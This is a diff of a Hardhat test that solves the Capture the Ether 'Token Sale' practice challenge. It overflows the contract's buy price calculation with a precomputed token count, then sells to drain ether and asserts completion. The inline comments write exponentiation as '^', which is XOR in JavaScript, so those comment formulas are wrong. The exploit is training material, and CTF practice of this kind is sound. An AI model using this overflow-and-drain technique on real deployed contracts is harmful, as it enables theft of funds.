@@ -36,33 +36,25 @@ describe('Start Point', async function () {
         await loadFixture(setup));
     });
 
-    it('Should Attack after approval', async function () {
-      let tokenSaleChallengeContractBalance = await ethers.provider.getBalance(
-        tokenSaleChallengeContract.address
-      );
+    it('Should Attack buy function', async function () {
+      const numTokens = ((2 ^ 256) - 1) / (10 ^ 18) + 1; // '115792089237316195423570985008687907853269984665640564039458'
+      const msgValue = numTokens * (10 ^ 18) - (2 ^ 256); // '415992086870360064
 
-      console.log({ tokenSaleChallengeContractBalance });
+      // console.log({ numTokens, msgValue });
 
       await tokenSaleChallengeContract.buy(
-        ethers.constants.MaxInt256.div(ethers.utils.parseEther('1')).add(1),
+        '115792089237316195423570985008687907853269984665640564039458',
         {
-          value: 1,
+          value: '415992086870360064',
         }
       );
 
-      tokenSaleChallengeContractBalance = await ethers.provider.getBalance(
-        tokenSaleChallengeContract.address
-      );
+      await tokenSaleChallengeContract.sell(1);
 
-      console.log({ tokenSaleChallengeContractBalance });
-
-      //   expect(
-      //     await tokenSaleChallengeContract.balanceOf(owner.address)
-      //   ).to.equal(1000);
-
-      //   expect(
-      //     await tokenSaleChallengeContract.balanceOf(owner.address)
-      //   ).to.equal(100000);
+      expect(await tokenSaleChallengeContract.isComplete()).to.equal(true);
     });
   });
 });
+
+// https://infosecwriteups.com/%EF%B8%8Fcapture-the-ether-%EF%B8%8F-token-sale-difficulty-low-medium-adc2928bbcc9
+// Static number
